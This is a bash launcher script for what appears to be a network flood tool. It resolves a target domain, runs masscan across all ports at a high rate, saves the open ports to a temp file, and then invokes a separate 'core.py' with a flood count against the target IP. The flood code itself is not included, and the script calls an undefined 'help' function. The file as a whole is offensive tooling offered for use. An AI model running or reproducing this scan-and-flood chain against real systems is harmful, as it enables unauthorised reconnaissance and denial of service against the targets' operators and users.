#!/bin/bash


DOMAIN=""
PORT=""
IP=""
FLOOD=10


if [ $# -eq 0 ]
then 
   help
   exit 1
fi


while [ $# -ne 0 ]
do
   case $1 in
   domain)

      DOMAIN=$2
      shift
   ;; 
   port)

      PORT=$2
      shift
   ;;
   ip)

      IP=$2
      shift
   ;;
   flood)

      FLOOD=$2
	   shift
   ;;
   *)

      exit 1
  esac	
 shift
done

if [ -z $IP ] && [ -z $DOMAIN ]
then
   exit 1
elif [ -z $IP ] && ! [ -z $DOMAIN ]
then
   IP=`ping $DOMAIN -c1| head -1| awk '{print $3}'| tr -d \)| tr -d \(`
fi


if [ -z $PORT ]
then
   PORT=`sudo masscan -p1-65535 $IP  --wait=10 --rate=10000  `
   echo $PORT | grep Discovered | sed 's/Discovered/\n/gi'| grep open | awk '{print $3}'| tr -d "/tcp" | tr -d " " > /tmp/OPEN_PORT
else
   echo $PORT > /tmp/OPEN_PORT
fi

python3 core.py $FLOOD $IP

rm -rf /tmp/OPEN_PORT
